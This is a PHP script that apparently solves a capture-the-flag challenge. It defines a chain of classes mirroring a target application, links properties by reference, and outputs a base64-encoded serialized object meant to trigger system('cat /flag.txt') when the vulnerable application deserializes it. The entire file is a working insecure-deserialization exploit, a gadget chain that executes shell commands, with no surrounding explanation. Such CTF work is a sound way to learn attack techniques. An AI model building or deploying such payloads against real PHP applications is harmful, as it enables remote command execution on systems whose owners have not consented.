<?php
namespace will\you\call\me {
    class CallMe
    {
    }
}

namespace iam\noone {
    class Noone
    {
        public $woo;
        public $oow;
        public function __construct($woo, $oow)
        {
            $this->woo = $woo;
            $this->oow = $oow;
        }
    }
}

namespace world\will\call\me {
    use iam\noone\Noone;

    class StrongestSorcerer
    {
        private Noone $callMe;
        private $cash = 0;
        public function __construct($callMe, $cash)
        {
            $this->callMe = $callMe;
            $this->cash = $cash;
        }
    }
}

namespace because\iam\strong\after\all {
    abstract class DomainExpansion
    {
        protected $domain;
        protected $juliet;
    }
}

namespace idwin\really\idwillwin {
    use because\iam\strong\after\all\DomainExpansion;

    class Stringify extends DomainExpansion
    {
        public $romeo;
        function __construct($domain)
        {
            $this->domain = $domain;
            $this->juliet = &$this->romeo;
        }
    }
}

namespace {
    $callMe = new will\you\call\me\CallMe();
    $noone = new iam\noone\Noone($callMe, "cat /flag.txt");
    $strongestSorcerer = new world\will\call\me\StrongestSorcerer($noone, "system");
    $stringify = new idwin\really\idwillwin\Stringify($strongestSorcerer);
    echo base64_encode(serialize($stringify));
}


